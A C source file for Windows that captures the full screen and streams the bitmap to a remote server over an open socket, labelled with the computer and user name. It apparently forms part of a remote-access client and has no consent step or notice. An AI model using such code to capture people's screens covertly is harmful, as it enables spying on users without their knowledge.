#include "screenshot.h"
#include "common.h"
#include "connection.h"
#include <stdio.h>
#include <stdlib.h>

HBITMAP CreateScreenshot()
{
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBitmap);

    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    return hBitmap;
}

void SendScreenshot()
{
    if (!bConnected)
        return;

    HBITMAP hBitmap = CreateScreenshot();
    if (!hBitmap)
        return;

    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    DWORD dwBmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;
    char *lpbitmap = (char *)malloc(dwBmpSize);

    HDC hdc = GetDC(NULL);
    GetDIBits(hdc, hBitmap, 0, bmp.bmHeight, lpbitmap, (BITMAPINFO *)&bi, DIB_RGB_COLORS);
    ReleaseDC(NULL, hdc);

    char header[256];
    sprintf(header, "SCREENSHOT|%s|%s|%dx%d|", computer_name, user_name, bmp.bmWidth, bmp.bmHeight);
    if (!SendDataToServer(header))
    {
        free(lpbitmap);
        DeleteObject(hBitmap);
        return;
    }

    int totalSent = 0;
    while (totalSent < dwBmpSize && bConnected)
    {
        int toSend = min(4096, dwBmpSize - totalSent);
        int sent = send(client_socket, lpbitmap + totalSent, toSend, 0);
        if (sent <= 0)
        {
            bConnected = FALSE;
            closesocket(client_socket);
            client_socket = INVALID_SOCKET;
            break;
        }
        totalSent += sent;
    }

    free(lpbitmap);
    DeleteObject(hBitmap);
}